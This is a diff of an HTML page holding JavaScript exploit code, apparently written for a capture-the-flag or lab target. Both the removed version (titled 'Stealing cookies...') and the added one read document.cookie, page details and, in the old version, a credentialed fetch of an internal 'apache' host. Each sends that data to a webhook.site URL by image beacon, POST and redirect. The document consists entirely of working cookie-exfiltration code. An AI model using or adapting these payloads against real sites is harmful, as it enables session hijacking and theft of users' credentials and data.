@@ -1,61 +1,33 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Loading...</title>
-</head>
 <body>
-    <h1>Stealing cookies...</h1>
-    
+<h1>Testing...</h1>
 <script>
-async function stealFlag() {
-    try {
-        console.log("Starting exploit...");
-        
-        const response = await fetch('https://apache/', {
-            method: 'GET',
-            credentials: 'include',  
-            mode: 'cors'
-        });
-        
-        const html = await response.text();
-        console.log("Got response from apache");
-        
-        const visibleCookies = document.cookie;
-        
-       
-        const webhookUrl = 'https://webhook.site/ec478dd5-ba0d-4a39-805c-67faa2025381';
-        
-        const stolenData = {
-            visibleCookies: visibleCookies,
-            apacheResponseLength: html.length,
-            apacheResponseSnippet: html.substring(0, 500), // First 500 chars
-            success: true
-        };
-        
-        const img = new Image();
-        img.src = webhookUrl + '?data=' + encodeURIComponent(JSON.stringify(stolenData));
-        
-        await fetch(webhookUrl, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify(stolenData)
-        });
-        
-        document.body.innerHTML = '<h1>Exploit completed!</h1>';
-        
-    } catch (error) {
-        console.error("Exploit failed:", error);
-        
-        // Send error to webhook
-        const webhookUrl = 'https://webhook.site/ec478dd5-ba0d-4a39-805c-67faa2025381';
-        const img = new Image();
-        img.src = webhookUrl + '?error=' + encodeURIComponent(error.toString());
-    }
+const webhook = 'https://webhook.site/ec478dd5-ba0d-4a39-805c-67faa2025381';
+
+const info = {
+    cookies: document.cookie,
+    url: window.location.href,
+    userAgent: navigator.userAgent,
+    timestamp: new Date().toISOString()
+};
+
+function sendData() {
+    const img = new Image();
+    img.src = webhook + '?method=img&data=' + encodeURIComponent(JSON.stringify(info));
+    
+    fetch(webhook, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({method: 'fetch', ...info})
+    }).catch(e => console.log('Fetch failed:', e));
+    
+    setTimeout(() => {
+        window.location = webhook + '?method=redirect&data=' + encodeURIComponent(JSON.stringify(info));
+    }, 2000);
 }
 
-// Start the exploit
-stealFlag();
+sendData();
 </script>
-
 </body>
 </html>
